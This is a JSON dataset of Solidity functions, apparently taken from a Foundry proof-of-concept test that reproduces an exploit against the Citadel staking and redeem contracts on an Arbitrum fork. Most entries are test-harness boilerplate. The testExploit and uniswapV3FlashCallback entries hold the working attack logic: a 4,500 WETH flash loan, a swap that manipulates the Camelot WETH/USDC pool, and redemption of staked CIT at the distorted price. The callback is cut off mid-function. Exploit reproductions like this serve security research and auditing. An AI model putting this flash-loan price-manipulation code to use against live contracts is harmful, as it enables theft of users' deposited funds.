[
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "IS_TEST",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeArtifacts",
    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeContracts",
    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeSenders",
    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "failed",
    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "setUp",
    "original_code": "    function setUp() public {\n        vm.createSelectFork(\"arbitrum\", 174_659_183);\n        vm.label(address(CitadelStaking), \"CitadelStaking\");\n        vm.label(address(CitadelRedeem), \"CitadelRedeem\");\n        vm.label(address(WETH_USDC), \"WETH_USDC\");\n        vm.label(address(WETH), \"WETH\");\n        vm.label(address(USDC), \"USDC\");\n        vm.label(address(CIT), \"CIT\");\n        vm.label(address(CamelotRouter), \"CamelotRouter\");\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifactSelectors",
    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifacts",
    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetContracts",
    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetInterfaces",
    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetSelectors",
    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetSenders",
    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "testExploit",
    "original_code": "    function testExploit() public {\n        // Before attack\n        // Deposit CIT tx: https://phalcon.blocksec.com/explorer/tx/arbitrum/0xcf75802229d440e4fbabb4d357fa1886c25e9a6b5c693e9e9573c71c15e2b0d3\n        // Exploiter transfer to attack contract following amount of CIT:\n        deal(address(CIT), address(this), 2653 * 1e18);\n        // Approve CIT tokens to CitadelStaking contract:\n        CIT.approve(address(CitadelStaking), CIT.balanceOf(address(this)));\n        // Deposit all CIT tokens at fixed rate (1) to CitadelStaking contract:\n        CitadelStaking.deposit(address(CIT), CIT.balanceOf(address(this)), 1);\n        emit log_named_decimal_uint(\n            \"Exploiter total staked CIT amount (minus fee) before attack\",\n            CitadelStaking.getTotalTokenStakedForUser(address(this), 1, address(CIT)),\n            CIT.decimals()\n        );\n\n        emit log_named_decimal_uint(\n            \"Exploiter WETH balance before attack\", WETH.balanceOf(address(this)), CIT.decimals()\n        );\n\n        vm.roll(174_662_726);\n        vm.warp(block.timestamp + 15 minutes + 13 seconds);\n\n        emit log_string(\"--------------------Start attack--------------------\");\n        // Start attack\n        // Take WETH flashloan -> 4_500 WETH\n        uint256 wethAmount = 4500 * 1e18;\n        bytes memory data = abi.encode(wethAmount);\n        WETH_USDC.flash(address(this), wethAmount, 0, data);\n\n        emit log_named_decimal_uint(\n            \"Exploiter WETH balance after attack\", WETH.balanceOf(address(this)), CIT.decimals()\n        );\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "uniswapV3FlashCallback",
    "original_code": "    function uniswapV3FlashCallback(uint256 fee0, uint256 fee1, bytes calldata data) external {\n        uint256 borrowedWETHAmount = abi.decode(data, (uint256));\n        WETH.approve(address(CamelotRouter), borrowedWETHAmount);\n\n        // Deposit borrowed WETH to WETH/USDC pair and swap to USDC (CamelotPair). Manipulate pool\n        emit log_named_decimal_uint(\n            \"Flashloaned amount of WETH to swap and manipulate WETH/USDC pair\", borrowedWETHAmount, WETH.decimals()\n        );\n        WETHToUSDC(borrowedWETHAmount);\n\n        uint256 amountIn = WETH.balanceOf(citadelTreasury);\n        address[] memory path = new address[](2);\n        path[0] = address(WETH);\n        path[1] = address(USDC);\n\n        uint256[] memory amounts = CamelotRouter.getAmountsOut(amountIn, path);\n        uint256 amountOutUSDC = amounts[1];\n\n        uint256 amountCITAvailable =\n            CitadelStaking.redeemCalculator(address(this))[0][1] + CitadelStaking.redeemCalculator(address(this))[1][1];\n\n        emit log_named_decimal_uint(\"Available amount of CIT to redeem\", amountCITAvailable, CIT.decimals());\n\n        uint256 citInUSD = CitadelStaking.getCITInUSDAllFixedRates(address(this), amountCITAvailable);\n\n        emit log_named_uint(\"Available amount of CIT to redeem in USDC\", citInUSD / 10 ** 12);\n\n        uint256 redeemAmount = amountCITAvailable;\n        if (amountOutUSDC < citInUSD / 10 ** 12) {\n            redeemAmount = redeemAmount / 3;\n        }\n\n",
    "description": ""
  }
]